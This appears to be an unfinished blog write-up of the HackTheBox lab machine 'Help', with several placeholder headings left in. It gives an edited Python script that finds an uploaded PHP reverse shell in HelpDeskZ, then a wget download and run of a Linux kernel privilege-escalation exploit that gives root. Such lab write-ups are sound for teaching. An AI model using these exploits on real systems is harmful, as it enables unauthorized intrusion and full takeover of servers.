---
layout:     post
title:      Help
summary:    Write-up of HackTheBox's Help.
categories: writeup
thumbnail: phone
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/help/infocard.png)

# Initial Scan

{% highlight plaintext %}
root@kali:~# nmap 10.10.10.121 -sC -sV -oA help.nmap
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 18:42 EDT
Nmap scan report for 10.10.10.121
Host is up (0.051s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
{% endhighlight %}

We see SSH and two HTTP ports. As usual, we'll set SSH aside for now, assuming it'll be used for access later on.

__Port 80__ has the default Apache2 page up:

![](/images/help/image1.png)

__Port 3000__ has an entirely different story:

![](/images/help/image2.png)

So what do we do first? I started with what I was more familiar with and fuzzed port 80 for extra directories—but apparently there is a way forward with port 3000.

# Discovering HelpDeskZ

I used Dirb to find a support page:

SHOW IMPORTANT DIRB THINGS HERE

Here's what we see:

![](/images/help/image3.png)

I do some initial research and come across this exploit: [https://www.exploit-db.com/exploits/40300](https://www.exploit-db.com/exploits/40300). This was missing some punctuation though that made it necessary to run, so I found an alternative here: [https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1608-exploits/helpdeskz-shell.txt](https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1608-exploits/helpdeskz-shell.txt).

The exploit describes a way of enumerating uploaded files, so that if you upload PHP code (unauthenticated!), you can find the URL and execute it. HelpDeskZ hashes the filename with MD5 and appends it to the current time (using epoch time)—a predictable pattern we can enumerate.

Before we go crazy using this exploit (which I, admittedly, did and had no success), we need to verify a few things:

1. The version of HelpDeskZ
2. What files we can upload
3. The upload path
4. The correct time
<br>
<br>

# Verifying the exploit

## HelpDeskZ version

## What files we can upload

You can find the file upload in the Submit Ticket functionality. It includes a few simple text fields, a "Browse" upload button, and a CAPTCHA, which makes automated attacks (e.g., fuzzing different file extensions) tricky.

![](/images/help/image4.png)

My first instinct is to take php-reverse-shell.php __(where can this be found?)__ with my IP and port 443 and try uploading it (as shell.php). It appears as though the upload failed.

![](/images/help/image5.png)

As I see it, there are two paths from here:

1. Blindly attempt a million and one known upload bypasses
2. Review the open-source code in Github

<br>
Because I clearly know what I'm doing, I spent a few hours on #1. I also keep failing these CAPTCHAs. I realize I haven't been to the eye doctor in three years. I can continue down this rabbit hole of getting my life back together, or I can jump to #2 . . . 

With any open-source software, it always pays to check out the code on Github, even if you (i.e., me) are super lazy and want to skip that step.

COOL PASSAGE ABOUT ANALYZING THE CODE HERE -- AND HOW THE PHP SHELL IS ACTUALLY ON THE SERVER

## The upload path

ALSO ON GITHUB

## The correct time

This one factor makes me strongly disagree with the 20-point "Easy" ranking of the box. It's one detail, but it causes a ton of trouble. I feel like the creator wasn't aware of this issue . . . 

Basically, the PHP upload exploit is based on time. The server is in a completely different time zone than your attacking box, yet running the exploit script locally will insert your time into the exploit, not the server's time. The script is set to a range or (0, 300)—in other words, every second of the past five minutes. If you aren't within a couple minutes of the server time, you aren't going to find your shell.

Just to add to the complication: The server time is off from the official time zone time.

There are a few ways to tackle this problem:

1. Modify the Python script to GET the server time and incorporate it into the file name (as Ippsec does in his video)
2. Sync your local box with the server time
3. Scramble and add the server time as the value of the variable in the Python script, upload the shell, quickly run the script, and pray

<br>
#2 was not working out for me, even though I was careful to line up my time super duper closely to the server time. So I had to resort to #3 and do all of the following steps in like a millisecond:

1) Send a GET request to http://10.10.10.121/support and view the headers in Burp.

![](/images/help/image6.png)

2) Convert the time to Epoch time.

![](/images/help/image7.png)

3) Upload my shell.

4) Modify the script to use that Epoch time.

{% highlight python %}

import hashlib
import time
import sys
import requests
 
print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
 
if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)
 
helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

#currentTime = int(time.time()) <-- Original line; local time
currentTime = 1569204120 # <-- New line

for x in range(-60, 1000):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()
 
    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)
 
print "Sorry, I did not find anything"
{% endhighlight %}

5) Run the script.

{% highlight plaintext %}
root@kali:~# python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/187212870f5853aeaa5787d39b46b16a.php
{% endhighlight %}

Set up a Netcat listener, visit the link, and rejoice.

![](/images/help/image8.png)

Upgrade your shell to a Python TTY:

![](/images/help/image9.png)

And we're on host __help__ as user __help__. The user flag can be found in help's home folder:

{% highlight plaintext %}
help@help:/home/help$ wc -c user.txt
wc -c user.txt
33 user.txt
{% endhighlight %}

# Privilege Escalation: Kernel exploit

One of the first things to do when escalating privileges in Linux is to view the kernel version with `uname -a`:

{% highlight plaintext %}
help@help:/home/help$ uname -a
uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

I search for "linux 4.4.0-116", and one of the first results is this exploit: [https://www.exploit-db.com/exploits/44298](https://www.exploit-db.com/exploits/44298)

I copy it over to my Kali box and server it up with Python SimpleHTTPServer:

{% highlight plaintext %}
root@kali:~# searchsploit -m 44298

Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation

URL: https://www.exploit-db.com/exploits/44298

Path: /usr/share/exploitdb/exploits/linux/local/44298.c

File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/44298.c

root@kali:~# python -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...
{% endhighlight %}

On the victim machine, I move to a /tmp folder and download the exploit:

{% highlight plaintext %}
help@help:/home/help$ cd /tmp
cd /tmp
help@help:/tmp$ wget http://10.10.14.11:8888/44298.c
wget http://10.10.14.11:8888/44298.c
--2019-09-22 19:15:31--  http://10.10.14.11:8888/44298.c
Connecting to 10.10.14.11:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6021 (5.9K) [text/plain]
Saving to: '44298.c'

44298.c             100%[===================>]   5.88K  --.-KB/s    in 0s

2019-09-22 19:15:31 (333 MB/s) - '44298.c' saved [6021/6021]
{% endhighlight %}

I compile it and make it executable:

{% highlight plaintext %}
help@help:/tmp$ gcc 44298.c -o 44298
gcc 44298.c -o 44298
help@help:/tmp$ chmod +x 44298
chmod +x 44298
{% endhighlight %}

Then I run it:

{% highlight plaintext %}
help@help:/tmp$ ./44298
./44298
task_struct = ffff88003a887000
uidptr = ffff880038a13084
spawning root shell
{% endhighlight %}

And we have root.

{% highlight plaintext %}
root@help:/tmp# whoami
whoami
root
{% endhighlight %}

Proof of flag.

{% highlight plaintext %}
root@help:/root# wc -c root.txt
wc -c root.txt
33 root.txt
{% endhighlight %}